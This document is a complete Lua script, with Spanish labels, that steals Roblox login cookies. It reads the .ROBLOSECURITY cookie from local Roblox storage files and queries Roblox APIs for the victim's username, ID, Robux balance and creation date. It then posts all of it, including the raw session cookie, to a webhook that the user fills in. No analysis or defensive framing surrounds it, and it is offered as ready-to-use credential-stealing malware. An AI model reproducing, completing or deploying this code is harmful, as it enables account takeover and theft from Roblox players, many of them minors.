loadstring([[
local WEBHOOK = "TU_WEBHOOK_AQUI"

local paths = {
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\robloxcookies.dat",
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\rbx-cookies.dat",
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\cookies.dat",
    os.getenv("LOCALAPPDATA") .. "\\Packages\\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\\LocalState\\robloxcookies.dat",
}

local function readFile(p) local f=io.open(p,"rb") if not f then return nil end local d=f:read("*a") f:close() return d end
local function findCookie(d) if not d then return nil end return d:match("(_|WARNING[^|]*|_[%w%%%+%/%=%-%._~]+)") end

local found, source
for _,p in ipairs(paths) do local c=findCookie(readFile(p)) if c then found,source=c,p break end end
if not found then
    local base=os.getenv("LOCALAPPDATA").."\\Roblox\\LocalStorage\\"
    local h=io.popen('dir "'..base..'" /b 2>nul')
    if h then for file in h:lines() do local c=findCookie(readFile(base..file)) if c then found,source=c,base..file break end end h:close() end
end

local function api(url,cookie)
    local h=io.popen('curl -s -H "Cookie: .ROBLOSECURITY='..cookie..'" "'..url..'"')
    if not h then return "{}" end local r=h:read("*a") h:close() return r or "{}"
end

local info, robux, created = "{}", "N/A", "N/A"
if found then
    info = api("https://users.roblox.com/v1/users/authenticated", found)
    local uid = info:match('"id":(%d+)')
    if uid then
        local r = api("https://economy.roblox.com/v1/users/"..uid.."/currency", found)
        robux = r:match('"robux":(%d+)') or "N/A"
        local d = api("https://users.roblox.com/v1/users/"..uid, found)
        created = d:match('"created":"([^"]+)"') or "N/A"
    end
end

local function esc(s) s=tostring(s or "") s=s:gsub("\\","\\\\"):gsub('"','\\"'):gsub("\n","\\n"):gsub("\r",""):gsub("\t"," ") return s end

local user = info:match('"name":"([^"]+)"') or "Desconocido"
local uid = info:match('"id":(%d+)') or "N/A"
local display = info:match('"displayName":"([^"]+)"') or user

local payload = string.format(
    '{"username":"Roblox Logger","embeds":[{"title":"Cuenta capturada","color":65280,"fields":['..
    '{"name":"Usuario","value":"%s","inline":true},'..
    '{"name":"ID","value":"%s","inline":true},'..
    '{"name":"Robux","value":"%s","inline":true},'..
    '{"name":"Creada","value":"%s","inline":false},'..
    '{"name":"Archivo","value":"`%s`","inline":false},'..
    '{"name":"Cookie","value":"`%s`","inline":false}'..
    '],"footer":{"text":"Venice.ai"}}]}',
    esc(display), esc(uid), esc(robux), esc(created), esc(source or "?"), esc(found or "?")
)

local tmp = os.getenv("TEMP").."\\rbxlog.json"
local f = io.open(tmp,"w") f:write(payload) f:close()
os.execute('curl -s -H "Content-Type: application/json" -X POST -d @"'..tmp..'" "'..WEBHOOK..'"')
]])
